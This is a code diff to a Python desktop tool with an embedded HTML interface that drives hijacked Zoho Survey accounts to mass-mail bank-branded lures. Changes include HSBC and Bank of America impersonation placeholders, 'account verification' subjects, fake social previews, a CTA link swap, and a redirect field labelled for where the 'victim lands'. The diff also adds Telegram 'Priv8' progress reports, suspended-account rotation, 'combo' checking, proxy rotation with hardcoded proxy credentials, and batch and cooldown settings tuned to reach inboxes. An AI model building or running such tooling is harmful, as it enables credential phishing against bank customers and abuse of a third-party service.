                             p["sent_count"] = p.get("sent_count", 0) + len(chunk)
+                            _new_total = p["sent_count"]
                             break
                     _save_profiles(profs)
+                except: _new_total = len(chunk)
+                # TG notification every batch sent
+                try:
+                    _tg_send(tg_token, tg_chat,
+                        f"[Priv8]  Batch {i}/{len(chunks)} sent\n"
+                        f"Prof {prof_idx}  |  {len(chunk)} emails\n"
+                        f"Total sent: {_new_total}  |  Subj: {subj[:40]}")
+                except: pass
+
+            # Detect account block/suspension/quota after send failure
+            if not ok:
+                try:
+                    _pg_chk = (d.execute_script("return document.body.innerText") or "").lower()
+                    _suspended_kws = ["account suspended", "account blocked", "account has been suspended",
+                                      "your account has been", "account deactivated", "not authorized",
+                                      "your trial has expired", "trial period", "upgrade your plan",
+                                      "email limit", "you have reached", "daily limit", "quota exceeded"]
+                    _is_blocked = any(kw in _pg_chk for kw in _suspended_kws)
+                    _is_logged_out = "accounts.zoho.com" in d.current_url
+                    if _is_blocked or _is_logged_out:
+                        _reason = "suspended" if _is_blocked else "logged_out"
+                        SEND_LOG.put(("err", f"  Account {_reason} — retiring profile {prof_idx}"))
+                        _tg_send_with_switch_btn(tg_token, tg_chat,
+                            f"[Priv8]  Account {_reason.upper()}\n"
+                            f"Profile {prof_idx}  |  Batch {i}/{len(chunks)}\n"
+                            f"Action: Switch to new combo", prof_idx)
+                        if prof_idx:
+                            try:
+                                profs = _load_profiles()
+                                for p in profs:
+                                    if p["idx"] == prof_idx:
+                                        p["health"] = _reason
+                                        break
+                                _save_profiles(profs)
+                            except: pass
+                        if window:
+                            try: window.evaluate_js("refreshProfiles()")
+                            except: pass
+                        break  # stop sending — this account is done
                 except: pass
 
             if i < len(chunks):
@@ -2069,14 +2636,15 @@ def _send_thread(cfg, emails, test_email, profile_dir, proxy=None, prof_idx=None
         if test_email.strip():
             time.sleep(random.randint(cd_min, cd_max))
             tpl = random.choice(templates)
-            html_t = _build_email_html(cfg, tpl)
+            html_t = _build_email_html(cfg, tpl, custom_link=tpl.get("cta_link") or cfg.get("cta_link", ""))
             SEND_LOG.put(("sep", f"   Test  {test_email.strip()} "))
             ok = DI.configure_email_invite(
                 d=d, portal_id=cfg["portal"], dept_id=cfg["dept"],
                 survey_id=cfg["survey"],
                 subject=f"[TEST] {random.choice(subjects)}",
                 body_html=html_t, recipients=test_email.strip(),
-                from_name=random.choice(sender_names))
+                from_name=random.choice(sender_names),
+                survey_name="​")
             SEND_LOG.put(("ok" if ok else "err", f"  Test: {'Sent' if ok else 'Failed'}"))
 
         if not _managed: SEND_LOG.put(("done", "  CAMPAIGN COMPLETE"))
@@ -2266,10 +2834,11 @@ class API:
                 idx  = prof["idx"]
                 em   = prof.get("email","")
                 pw_  = prof.get("imap_pw","") or _pw_map.get(em,"") or prof.get("password","")
-                prx  = prof.get("proxy") or None
+                # Use Webshare Egypt for session check (avoids mobile OTP on relogin)
+                _check_proxy = "gdiwrafcresidential-rotate:mqzo2x6uux4o@p.webshare.io:80"
                 d2   = None
                 try:
-                    d2 = _build_driver(prof["dir"], proxy=prx, headless=_hidden_browser)
+                    d2 = _build_driver(prof["dir"], proxy=_check_proxy, headless=_hidden_browser)
                     d2.get("https://survey.zoho.com/survey/newui")
                     time.sleep(7)
                     cur = d2.current_url
@@ -2379,6 +2948,9 @@ class API:
             if p["idx"] == int(prof_idx):
                 p["status"] = "free"; p["email"] = ""
                 p["connected_at"] = None; p["health"] = "ok"
+                p["sent_count"] = 0
+                p["zoho_password"] = ""; p["imap_pw"] = ""
+                p.pop("portal_id", None); p.pop("dept_id", None); p.pop("survey_id", None)
                 break
         _save_profiles(profiles); return {"ok": True}
 
@@ -2396,6 +2968,20 @@ class API:
         tg_chat  = payload.get("tg_chat", "")
         _do_switch_profile(prof_idx, tg_token, tg_chat)
         return {"ok": True}
+
+    def send_tg_status(self, payload):
+        """Send status report to Telegram (triggered from UI button)."""
+        tg_token = payload.get("tg_token", "")
+        tg_chat  = payload.get("tg_chat", "")
+        if not tg_token or not tg_chat:
+            cfg = _load_cfg()
+            tg_token = tg_token or cfg.get("tg_token", "")
+            tg_chat  = tg_chat  or cfg.get("tg_chat", "")
+        try:
+            _tg_send(tg_token, tg_chat, _tg_get_status_text())
+            return {"ok": True}
+        except Exception as e:
+            return {"error": str(e)}
 
     #  EMAIL SENDER
 
@@ -2459,11 +3045,17 @@ class API:
             t.start()
             threads.append(t)
             SEND_LOG.put(("info", f"  Profile {prof['idx']} ({prof.get('email','?')}): {len(chunk)} emails"))
-        def _watcher(tlist=threads):
+        _tg_tok = cfg.get("tg_token", "")
+        _tg_ch  = cfg.get("tg_chat", "")
+        def _watcher(tlist=threads, _n=len(all_emails), _ap=len(active)):
             global _send_running
             for t in tlist: t.join()
             _send_running = False
             SEND_LOG.put(("done", f"  ALL {len(tlist)} PROFILES COMPLETE"))
+            _tg_send(_tg_tok, _tg_ch,
+                f"[Priv8]  Campaign COMPLETE\n"
+                f"{_ap} profiles  |  {_n} emails total\n"
+                f"Time: {time.strftime('%H:%M:%S')}")
             if window:
                 try: window.evaluate_js("onSendDone()")
                 except: pass
@@ -2486,10 +3078,70 @@ class API:
         return _load_templates()
 
     def save_templates(self, templates):
-        cfg = _load_cfg()
-        cfg["templates"] = templates
-        json.dump(cfg, open(CFG_FILE,"w",encoding="utf-8"), indent=2)
+        _save_templates(templates)
         return {"ok": True}
+
+    def get_template_categories(self):
+        """Return list of unique categories from templates.json."""
+        tpls = _load_templates()
+        cats = sorted(set(t.get("category", "other") for t in tpls if t.get("category")))
+        return cats
+
+    def get_templates_by_category(self, category):
+        """Return templates filtered by category (or 'all')."""
+        tpls = _load_templates()
+        if category and category != "all":
+            tpls = [t for t in tpls if t.get("category") == category]
+        return tpls
+
+    def fetch_proxies(self, count=10):
+        """Fetch SOCKS5 proxies from ProxyScrape v3 (free) API."""
+        import urllib.request as _ur
+        PS_USER = "alv68pcvy8kb"
+        PS_PASS = "u0qd0imgg1i4nj4"
+        proxies = []
+        # v3 free endpoints — no API key needed, format=text works
+        urls = [
+            "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&format=text&timeout=10000&country=all",
+            "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&format=text&timeout=10000&country=all",
+            "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&format=text&timeout=10000&anonymity=elite",
+        ]
+        for url in urls:
+            try:
+                req = _ur.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+                ctx = ssl._create_unverified_context()
+                resp = _ur.urlopen(req, context=ctx, timeout=15)
+                txt = resp.read().decode("utf-8").strip()
+                lines = [l.strip() for l in txt.splitlines() if ":" in l.strip() and not l.startswith("#")]
+                for line in lines:
+                    parts = line.split(":")
+                    if len(parts) == 2:
+                        proxies.append(f"{PS_USER}:{PS_PASS}@{line}")
+                if proxies:
+                    break
+            except Exception as _e:
+                CHECK_LOG.put(("warn", f"  ProxyScrape fetch error: {_e}"))
+        if not proxies:
+            return {"ok": False, "error": "No proxies fetched", "proxies": []}
+        import random
+        sample = random.sample(proxies, min(count, len(proxies)))
+        return {"ok": True, "proxies": sample, "total": len(proxies)}
+
+    def assign_proxies_to_profiles(self, proxies):
+        """Assign a different proxy to each profile from the given list."""
+        profiles = _load_profiles()
+        assigned = []
+        for i, prof in enumerate(profiles):
+            if i < len(proxies):
+                prof["proxy"] = proxies[i]
+                assigned.append({"idx": prof["idx"], "proxy": proxies[i]})
+        _save_profiles(profiles)
+        # Also update sender_cfg.json proxy_str with first proxy
+        if proxies:
+            cfg = _load_cfg()
+            cfg["proxy_str"] = proxies[0]
+            json.dump(cfg, open(CFG_FILE,"w",encoding="utf-8"), indent=2)
+        return {"ok": True, "assigned": assigned}
 
     def get_send_options(self):
         return _load_send_options()
@@ -2505,7 +3157,8 @@ class API:
     #  SHARED 
 
     def save_cfg(self, cfg):
-        global _hidden_browser, CAPTCHA_KEY, _DEFAULT_PROXY
+        global _hidden_browser, CAPTCHA_KEY
+        # NOTE: _DEFAULT_PROXY stays as Webshare Egypt for registration — proxy_str is send-only
         existing = _load_cfg()
         for k in ("captcha_key", "proxy_str"):
             if not cfg.get(k):
@@ -2515,8 +3168,6 @@ class API:
         _hidden_browser = bool(existing.get("hidden_browser", False))
         if existing.get("captcha_key"):
             CAPTCHA_KEY = existing["captcha_key"]
-        if existing.get("proxy_str"):
-            _DEFAULT_PROXY = existing["proxy_str"]
         return {"ok": True}
 
     def load_cfg(self):
@@ -2524,15 +3175,7 @@ class API:
         if not cfg.get("captcha_key"):
             cfg["captcha_key"] = CAPTCHA_KEY
         if not cfg.get("proxy_str"):
-            # Try to load from .env first
-            proxy_host = os.getenv("PROXY_HOST", "").strip()
-            proxy_port = os.getenv("PROXY_PORT", "").strip()
-            if proxy_host and proxy_port:
-                cfg["proxy_str"] = f"{proxy_host}:{proxy_port}"
-            elif _DEFAULT_PROXY:
-                cfg["proxy_str"] = _DEFAULT_PROXY
-            else:
-                cfg["proxy_str"] = ""
+            cfg["proxy_str"] = _DEFAULT_PROXY
         if not cfg.get("tg_token"):
             cfg["tg_token"] = ""
         return cfg
@@ -2612,6 +3255,18 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
 .btn-s{padding:4px 11px;border-radius:5px;font-size:10px;font-weight:600;
   cursor:pointer;border:none;background:#ffffff14;color:#fff;transition:.12s}
 .btn-s:hover{background:#ffffff22}
+.pill-cat{padding:3px 10px;border-radius:12px;font-size:9px;font-weight:600;
+  cursor:pointer;border:1px solid var(--border);background:transparent;color:var(--muted);transition:.12s}
+.pill-cat.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+.pill-cat:hover:not(.active){background:#ffffff14;color:#fff}
+.tpl-card{background:#060f1a;border:1px solid var(--border);border-radius:7px;padding:8px 10px;
+  cursor:pointer;transition:.15s;position:relative}
+.tpl-card:hover{border-color:var(--accent);background:#0a1929}
+.tpl-card.selected{border-color:#34d399;background:#052618}
+.tpl-card-name{font-size:9px;font-weight:700;color:#fff;margin:0 0 2px;
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.tpl-card-cat{font-size:8px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px}
+.tpl-card-bar{height:3px;border-radius:2px;margin-bottom:5px}
 
 /*  LAYOUT  */
 .wrap{display:flex;height:calc(100vh - 44px);overflow:hidden}
@@ -2963,12 +3618,15 @@ textarea{resize:vertical;min-height:65px}
 <div class="card">
   <div class="ch"><span class="ci"></span>
     <span class="ct">Browser Profiles</span>
-    <span style="margin-left:6px;font-size:9px;color:var(--muted)">
-      3 free (direct IP)  add residential proxy to unlock more</span>
     <button onclick="checkSessionsHealth()" id="btn-health"
       style="margin-left:auto;padding:5px 12px;background:#0f3460;color:#60a5fa;
         border:1px solid #1e5a9c;border-radius:5px;cursor:pointer;font-size:10px;font-weight:700">
        Refresh & Check Sessions</button>
+    <button onclick="sendTgStatus()"
+      style="margin-left:6px;padding:5px 12px;background:#064e3b;color:#34d399;
+        border:1px solid #065f46;border-radius:5px;cursor:pointer;font-size:10px;font-weight:700"
+      title="Send /status report to Telegram">
+       TG Status</button>
   </div>
   <div class="cb">
     <div class="profs-grid" id="profs-grid"><!-- rendered by JS --></div>
@@ -3015,6 +3673,10 @@ textarea{resize:vertical;min-height:65px}
     <label style="display:flex;align-items:center;gap:6px;font-size:10px;margin-top:6px;cursor:pointer">
       <input type="checkbox" id="hidden_browser" onchange="saveCfg()">
       Hidden Browser (browsers run invisible in background)</label>
+    <div style="margin-top:8px">
+      <label>&#128279; Custom CTA Link <span style="font-size:9px;color:var(--muted)">(replaces Zoho "Begin Survey" button — leave blank to keep Zoho button)</span></label>
+      <input type="url" id="cta_link" placeholder="https://yoursite.com/page?vid=123" oninput="saveCfg()" style="font-size:10px">
+    </div>
     <div class="g2" style="margin-top:8px">
       <div><label>Reply-To Email</label>
         <input type="email" id="reply_to" placeholder="Optional reply-to address" oninput="saveCfg()" style="font-size:10px"></div>
@@ -3039,10 +3701,18 @@ textarea{resize:vertical;min-height:65px}
     <label>After Survey Completion</label>
     <select id="end_page_type" onchange="toggleEndPageFields();saveCfg()">
       <option value="default">Default &#8212; Zoho Thank You page</option>
-      <option value="redirect">Redirect to URL</option>
+      <option value="auto_redirect">&#9889; Branded Page + Auto-Redirect (recommended)</option>
+      <option value="redirect">Redirect to URL (instant)</option>
       <option value="message">Custom Message</option>
       <option value="summary">Show Response Summary</option>
     </select>
+    <div id="ep_ar_wrap" style="display:none;margin-top:6px">
+      <label>Redirect URL <span style="color:var(--muted);font-size:9px">(victim lands here after branded page)</span></label>
+      <input type="url" id="ep_ar_url" placeholder="https://www.hsbc.com" oninput="saveCfg()" style="font-size:10px">
+      <label style="margin-top:6px">Delay (seconds) <span style="color:var(--muted);font-size:9px">(0 = instant, 2 = default)</span></label>
+      <input type="number" id="ep_ar_delay" value="2" min="0" max="10" oninput="saveCfg()" style="font-size:10px;width:80px">
+      <p style="font-size:9px;color:var(--muted);margin:4px 0 0">Shows branded ✓ confirmation page then auto-redirects. Brand color &amp; logo pulled from template automatically.</p>
+    </div>
     <div id="ep_url_wrap" style="display:none;margin-top:6px">
       <label>Redirect URL</label>
       <input type="url" id="end_page_url" placeholder="https://your-site.com/thank-you" oninput="saveCfg()" style="font-size:10px">
@@ -3052,6 +3722,50 @@ textarea{resize:vertical;min-height:65px}
       <input type="text" id="end_page_msg" placeholder="Thank you for your time!" oninput="saveCfg()" style="font-size:10px">
     </div>
     <p style="font-size:9px;color:var(--muted);margin:6px 0 0">Applied via Zoho Settings once at browser start &#8212; leave Default to skip.</p>
+  </div>
+</div>
+
+<div class="card">
+  <div class="ch"><span class="ci">&#128279;</span><span class="ct">Social Media Preview (OG Tags)</span>
+    <span style="margin-left:auto;font-size:9px;color:var(--muted)">configured once per session</span>
+  </div>
+  <div class="cb">
+    <p style="font-size:9px;color:var(--muted);margin:0 0 8px">Shown when survey link is shared on WhatsApp / Facebook / Telegram. Leave blank to skip.</p>
+    <label>Preview Title</label>
+    <input type="text" id="og_title" placeholder="HSBC — Account Verification Required" oninput="saveCfg()" style="font-size:10px">
+    <label style="margin-top:6px">Preview Description</label>
+    <input type="text" id="og_description" placeholder="Complete your account verification to continue." oninput="saveCfg()" style="font-size:10px">
+    <label style="margin-top:6px">Preview Image URL <span style="color:var(--muted);font-size:9px">(logo or banner — shown as thumbnail)</span></label>
+    <input type="url" id="og_image_url" placeholder="https://logo.clearbit.com/hsbc.com" oninput="saveCfg()" style="font-size:10px">
+    <label style="display:flex;align-items:center;gap:6px;font-size:10px;margin-top:8px;cursor:pointer">
+      <input type="checkbox" id="og_auto_from_template" onchange="saveCfg()" checked>
+      Auto-fill from template (uses org_name, org_sub, logo_url if fields above are blank)</label>
+  </div>
+</div>
+
+<div class="card">
+  <div class="ch"><span class="ci">&#127919;</span><span class="ct">Survey Page Branding</span>
+    <span style="margin-left:auto;font-size:9px;color:var(--muted)">configured once per session</span>
+  </div>
+  <div class="cb">
+    <label>CTA Button Label <span style="color:var(--muted);font-size:9px">(default: Begin Survey)</span></label>
+    <input type="text" id="survey_button_text" placeholder="Begin Survey" oninput="saveCfg()" style="font-size:10px">
+    <label style="margin-top:8px">Survey Page Logo URL <span style="color:var(--muted);font-size:9px">(optional — shown on survey page)</span></label>
+    <input type="url" id="survey_logo_url" placeholder="https://logo.clearbit.com/company.com" oninput="saveCfg()" style="font-size:10px">
+    <label style="margin-top:8px">Survey Theme Color <span style="color:var(--muted);font-size:9px">(primary/button color on survey page)</span></label>
+    <div style="display:flex;gap:6px;align-items:center">
+      <input type="color" id="c_survey_theme" value="#0057b8" oninput="syncC('survey_theme_color',this.value);saveCfg()">
+      <input type="text" id="survey_theme_color" placeholder="#0057b8" oninput="syncC2('survey_theme',this.value);saveCfg()" style="font-size:10px;flex:1">
+    </div>
+    <label style="margin-top:8px">Survey Footer Text <span style="color:var(--muted);font-size:9px">(shown at bottom of survey page)</span></label>
+    <input type="text" id="survey_footer_text" placeholder="© 2026 HSBC Holdings plc. All rights reserved." oninput="saveCfg()" style="font-size:10px">
+    <div style="display:flex;align-items:center;gap:8px;margin-top:10px">
+      <input type="checkbox" id="hide_progress_bar" onchange="saveCfg()" style="width:14px;height:14px;accent-color:var(--acc);cursor:pointer">
+      <label for="hide_progress_bar" style="margin:0;font-size:11px;cursor:pointer">Hide progress bar <span style="color:var(--muted);font-size:9px">(makes survey feel less like a survey)</span></label>
+    </div>
+    <label style="margin-top:10px">Terms &amp; Conditions Text <span style="color:var(--muted);font-size:9px">(respondent must agree before submit — leave blank to disable)</span></label>
+    <input type="text" id="survey_terms_text" placeholder="By submitting, you agree to our Privacy Policy." oninput="saveCfg()" style="font-size:10px">
+    <p style="font-size:9px;color:var(--muted);margin:6px 0 0">Leave blank to keep defaults. Applied via Zoho Settings once at browser start.</p>
   </div>
 </div>
 
@@ -3076,12 +3790,13 @@ textarea{resize:vertical;min-height:65px}
         <div class="fi" id="recip-fi">No file selected</div>
       </div>
     </div>
-    <div class="rctr" id="rctr">0 emails  0 batches of 100</div>
+    <div class="rctr" id="rctr">0 emails  0 batches of 50</div>
     <div class="g4">
-      <div><label>Batch Size</label>
-        <input type="text" id="batch_size" value="100" oninput="updCtr()"></div>
-      <div><label>Cooldown Min (s)</label><input type="text" id="cd_min" value="55"></div>
-      <div><label>Cooldown Max (s)</label><input type="text" id="cd_max" value="75"></div>
+      <div><label>Batch Size <span style="font-size:9px;color:var(--muted)">(max 50 for inbox)</span></label>
+        <input type="text" id="batch_size" value="50" oninput="updCtr()"></div>
+      <div><label>Cooldown Min (s) <span style="font-size:9px;color:var(--muted)">(≥90s safe)</span></label>
+        <input type="text" id="cd_min" value="90"></div>
+      <div><label>Cooldown Max (s)</label><input type="text" id="cd_max" value="120"></div>
       <div><label>Test Email (sent last)</label>
         <input type="email" id="test_email" placeholder="you@example.com"></div>
     </div>
@@ -3093,41 +3808,148 @@ textarea{resize:vertical;min-height:65px}
 <!--  TAB: DESIGN  -->
 <div class="page" id="tab-design">
 
+<!-- ═══ PROXY SECTION ═══ -->
 <div class="card">
-  <div class="ch"><span class="ci"></span><span class="ct">Logo</span></div>
+  <div class="ch">
+    <span class="ci">🌐</span>
+    <span class="ct">Proxies</span>
+    <span style="margin-left:6px;font-size:9px;color:var(--muted)">each profile gets a different proxy</span>
+    <button onclick="fetchProxies()" class="btn-s" style="margin-left:auto;background:#064e3b;color:#34d399;border-color:#065f46;font-size:9px">
+      ⬇ Fetch from ProxyScrape
+    </button>
+  </div>
   <div class="cb">
-    <div class="mt-row">
-      <button class="mt active" onclick="switchLogo('url',this)"> URL</button>
-      <button class="mt" onclick="switchLogo('file',this)"> Upload</button>
-    </div>
-    <div id="logo-url-w">
-      <input type="text" id="logo_url" placeholder="https://example.com/logo.png" oninput="rp()">
-    </div>
-    <div id="logo-file-w" style="display:none">
-      <div class="fdrop" onclick="pickLogo()">
-        <div style="font-size:20px;margin-bottom:3px"></div>
-        Upload logo (PNG / JPG)
-        <div class="fi" id="logo-fi">No file</div>
+    <div class="g2">
+      <div>
+        <label>SOCKS5 Proxy — Profile 1</label>
+        <input type="text" id="proxy_p1" placeholder="user:pass@host:port">
+      </div>
+      <div>
+        <label>SOCKS5 Proxy — Profile 2</label>
+        <input type="text" id="proxy_p2" placeholder="user:pass@host:port">
+      </div>
+      <div>
+        <label>SOCKS5 Proxy — Profile 3</label>
+        <input type="text" id="proxy_p3" placeholder="user:pass@host:port">
+      </div>
+      <div>
+        <label>Fetched pool (select to assign)</label>
+        <select id="proxy_pool_sel" size="4" style="width:100%;font-family:monospace;font-size:9px;background:var(--bg2);color:var(--fg);border:1px solid var(--border);border-radius:5px">
+          <option disabled>— fetch proxies first —</option>
+        </select>
       </div>
     </div>
-    <div id="logo-prev" style="min-height:32px;display:flex;align-items:center;justify-content:center"></div>
+    <div style="display:flex;gap:8px;margin-top:8px">
+      <button onclick="assignProxies()" style="padding:6px 14px;background:var(--accent);color:#fff;font-weight:700;border:none;border-radius:5px;cursor:pointer;font-size:10px">
+        ✓ Assign &amp; Save
+      </button>
+      <span id="proxy-status" style="font-size:9px;color:var(--muted);align-self:center"></span>
+    </div>
   </div>
 </div>
 
+<!-- ═══ TEMPLATE PICKER ═══ -->
 <div class="card">
-  <div class="ch"><span class="ci"></span><span class="ct">Colors</span></div>
+  <div class="ch">
+    <span class="ci">📋</span>
+    <span class="ct">Template Library</span>
+    <span style="margin-left:6px;font-size:9px;color:var(--muted)">250 inbox-tested templates</span>
+  </div>
+  <div class="cb">
+    <!-- Category filter -->
+    <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px" id="cat-pills">
+      <button class="pill-cat active" onclick="filterCat('all',this)">All</button>
+    </div>
+    <!-- Search -->
+    <input type="text" id="tpl-search" placeholder="Search templates…" oninput="filterTemplates()" style="margin-bottom:8px">
+    <!-- Grid -->
+    <div id="tpl-grid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:8px;max-height:340px;overflow-y:auto"></div>
+    <!-- Selected info -->
+    <div id="tpl-selected-info" style="margin-top:8px;padding:6px 10px;background:var(--bg2);border-radius:6px;font-size:9px;display:none">
+      <strong id="tpl-sel-name"></strong> — <span id="tpl-sel-subj"></span>
+      <button onclick="applySelectedTemplate()" style="margin-left:8px;padding:3px 10px;background:var(--accent);color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:9px;font-weight:700">
+        ✓ Use This Template
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ LETTER BUILDER ═══ -->
+<div class="card">
+  <div class="ch">
+    <span class="ci">✏</span>
+    <span class="ct">Letter Builder</span>
+    <button onclick="rp()" class="btn-s" style="margin-left:auto;font-size:9px">↻ Refresh Preview</button>
+  </div>
   <div class="cb">
     <div class="g2">
-      <div><label>Banner Color 1</label>
+      <!-- Colors -->
+      <div>
+        <label>Banner Color 1</label>
         <div class="cr">
           <input type="color" id="c_b1" value="#0057b8" oninput="syncC('banner1',this.value);rp()">
           <input type="text" id="banner1" value="#0057b8" oninput="syncC2('b1',this.value);rp()">
-        </div></div>
-      <div><label>Banner Color 2</label>
+        </div>
+      </div>
+      <div>
+        <label>Banner Color 2</label>
         <div class="cr">
           <input type="color" id="c_b2" value="#00a3e0" oninput="syncC('banner2',this.value);rp()">
           <input type="text" id="banner2" value="#00a3e0" oninput="syncC2('b2',this.value);rp()">
-        </div></div>
+        </div>
+      </div>
+    </div>
+    <!-- Logo -->
+    <div class="g2" style="margin-top:6px">
+      <div>
+        <label>Logo URL</label>
+        <input type="text" id="logo_url" placeholder="https://logo.clearbit.com/example.com" oninput="rp()">
+      </div>
+      <div>
+        <label>Logo Background</label>
+        <div class="cr">
+          <input type="color" id="c_logo_bg" value="#ffffff" oninput="syncC('logo_bg',this.value)">
+          <input type="text" id="logo_bg" value="#ffffff" oninput="syncC2('logo_bg',this.value)">
+        </div>
+      </div>
+    </div>
+    <!-- Org name & sub -->
+    <div class="g2" style="margin-top:6px">
+      <div>
+        <label>Organization Name</label>
+        <input type="text" id="org_name" placeholder="Bank of America" oninput="rp()">
+      </div>
+      <div>
+        <label>Subtitle / Department</label>
+        <input type="text" id="org_sub" placeholder="Online Security Division" oninput="rp()">
+      </div>
+    </div>
+    <!-- Subject -->
+    <div style="margin-top:6px">
+      <label>Email Subject</label>
+      <input type="text" id="tpl_subject" placeholder="Important Notice — Action Required">
+    </div>
+    <!-- Body -->
+    <div style="margin-top:6px">
+      <label>Email Body (HTML allowed)</label>
+      <textarea id="tpl_body" rows="6" oninput="rp()" placeholder="&lt;p&gt;Dear Valued Customer,&lt;/p&gt;&#10;&lt;p&gt;We are writing regarding your account...&lt;/p&gt;"></textarea>
+    </div>
+    <!-- Footer -->
+    <div style="margin-top:6px">
+      <label>Footer Text</label>
+      <input type="text" id="tpl_footer" placeholder="© 2026 Organization Name. All rights reserved.">
+    </div>
+    <div style="display:flex;gap:8px;margin-top:10px;flex-wrap:wrap">
+      <button onclick="saveBuilderTemplate()"
+        style="padding:7px 18px;background:var(--accent);color:#fff;font-weight:700;
+          border:none;border-radius:5px;cursor:pointer;font-size:10px">
+        💾 Save as Active Template
+      </button>
+      <button onclick="addBuilderToList()"
+        style="padding:7px 14px;background:#1e3a5f;color:#fff;font-weight:700;
+          border:none;border-radius:5px;cursor:pointer;font-size:10px">
+        + Add to Rotation
+      </button>
     </div>
   </div>
 </div>
@@ -3135,39 +3957,40 @@ textarea{resize:vertical;min-height:65px}
 <!-- SENDER NAMES & SUBJECTS -->
 <div class="card">
   <div class="ch"><span class="ci"></span><span class="ct">Sender Names &amp; Subjects</span>
-    <span style="margin-left:6px;font-size:9px;color:var(--muted)">one per line  picked randomly per rotation</span>
+    <span style="margin-left:6px;font-size:9px;color:var(--muted)">one per line — picked randomly</span>
   </div>
   <div class="cb">
     <div class="g2">
       <div>
         <label>Sender Names (one per line)</label>
         <textarea class="opts-ta" id="sender_names"
-          placeholder="Research Team&#10;Customer Team&#10;Support Team&#10;Marketing Team"></textarea>
+          placeholder="Research Team&#10;Customer Team&#10;Support Team"></textarea>
       </div>
       <div>
         <label>Subjects (one per line)</label>
         <textarea class="opts-ta" id="subjects"
-          placeholder="Quick Survey - Your Opinion Matters&#10;We'd Love Your Feedback!&#10;Help Us Improve - 3 Min Survey"></textarea>
+          placeholder="Quick Survey&#10;We'd Love Your Feedback!&#10;Help Us Improve"></textarea>
       </div>
     </div>
-    <div style="display:flex;gap:8px;align-items:center">
+    <div style="display:flex;gap:8px;align-items:center;margin-top:6px">
       <div style="flex:1">
-        <label>Rotate every N batches (1 = every 100 emails)</label>
+        <label>Rotate every N batches</label>
         <input type="text" id="rotate_every" value="1" style="max-width:80px">
       </div>
       <button onclick="saveOpts()"
         style="padding:6px 14px;background:var(--accent);color:#fff;font-weight:700;
           border:none;border-radius:5px;cursor:pointer;font-size:10px;align-self:flex-end">
-         Save Options</button>
+        ✓ Save
+      </button>
     </div>
   </div>
 </div>
 
-<!-- TEMPLATES -->
+<!-- ACTIVE TEMPLATES LIST -->
 <div class="card">
-  <div class="ch"><span class="ci"></span><span class="ct">Email Templates</span>
-    <span style="margin-left:6px;font-size:9px;color:var(--muted)">multiple = random rotation</span>
-    <button class="btn-s" onclick="addTemplate()" style="margin-left:auto;font-size:9px">+ Add Template</button>
+  <div class="ch"><span class="ci"></span><span class="ct">Active Templates (rotation)</span>
+    <span style="margin-left:6px;font-size:9px;color:var(--muted)">multiple = random rotation per batch</span>
+    <button class="btn-s" onclick="addTemplate()" style="margin-left:auto;font-size:9px">+ Manual Add</button>
   </div>
   <div class="cb" id="tpl-list" style="gap:10px">
     <!-- rendered by JS -->
@@ -3176,16 +3999,18 @@ textarea{resize:vertical;min-height:65px}
     <button onclick="saveTemplates()"
       style="padding:6px 18px;background:var(--accent);color:#fff;font-weight:700;
         border:none;border-radius:5px;cursor:pointer;font-size:10px">
-       Save All Templates</button>
+      💾 Save All Templates
+    </button>
   </div>
 </div>
 
+<!-- PREVIEW -->
 <div class="card">
-  <div class="ch"><span class="ci"></span><span class="ct">Preview (Template 1)</span>
-    <button onclick="rp()" class="btn-s" style="margin-left:auto;font-size:9px"> Refresh</button>
+  <div class="ch"><span class="ci"></span><span class="ct">Email Preview</span>
+    <button onclick="rp()" class="btn-s" style="margin-left:auto;font-size:9px">↻ Refresh</button>
   </div>
   <div style="background:#e8e8e8;border-radius:0 0 10px 10px;overflow:hidden;min-height:180px">
-    <iframe id="pf" style="width:100%;min-height:200px;border:none;display:block"></iframe>
+    <iframe id="pf" style="width:100%;min-height:280px;border:none;display:block"></iframe>
   </div>
 </div>
 
@@ -3249,6 +4074,7 @@ let _dlgProfIdx = 1;
 let _templates  = [];
 
 const gv = id => { const e=document.getElementById(id); return e?(e.value||''):''; }
+const sv = (id,val) => { const e=document.getElementById(id); if(e)e.value=val; }
 function addLog(tag,msg){
   const b=document.getElementById('log');
   const s=document.createElement('span');
@@ -3271,7 +4097,7 @@ function switchTab(t,btn){
   const showSend=t==='sender'||t==='design';
   document.getElementById('send-wrap').style.display=showSend?'':'none';
   if(t==='profiles') refreshProfiles();
-  if(t==='design'){setTimeout(rp,50);loadTemplatesUI();loadOptsUI();}
+  if(t==='design'){setTimeout(rp,50);loadTemplatesUI();loadOptsUI();loadTemplateLibrary();}
   if(t==='sender') refreshProfSelect();
 }
 
@@ -3570,7 +4396,7 @@ function renderProfiles(profs){
 
 async function openConnectDlgForProf(profIdx){
   const valids=await pywebview.api.get_valid_combos();
-  const unconnected=valids.filter(v=>v.connected_profile==null);
+  const unconnected=valids.filter(v=>v.connected_profile==null&&!v.blocked);
   if(!unconnected.length){
     addLog('err','  No unconnected valid combos  run Combo Checker first');return;
   }
@@ -3585,6 +4411,11 @@ async function openConnectDlgForProf(profIdx){
 async function disconnectProf(idx){
   await pywebview.api.disconnect_profile(idx);
   refreshProfiles();
+}
+
+async function sendTgStatus(){
+  const r=await pywebview.api.send_tg_status({tg_token:gv('tg_token'),tg_chat:gv('tg_chat')});
+  addLog(r&&r.ok?'ok':'err', r&&r.ok?' Status sent to Telegram':'  TG status failed (check token/chat)');
 }
 
 async function saveProxy(idx){
@@ -3667,6 +4498,13 @@ async function sendCampaign(){
     schedule_dt:gv('schedule_dt'),
     end_page_type:gv('end_page_type')||'default',
     end_page_url:gv('end_page_url'),end_page_msg:gv('end_page_msg'),
+    ep_ar_url:gv('ep_ar_url'),ep_ar_delay:parseInt(gv('ep_ar_delay')||'2',10),
+    survey_button_text:gv('survey_button_text'),survey_logo_url:gv('survey_logo_url'),
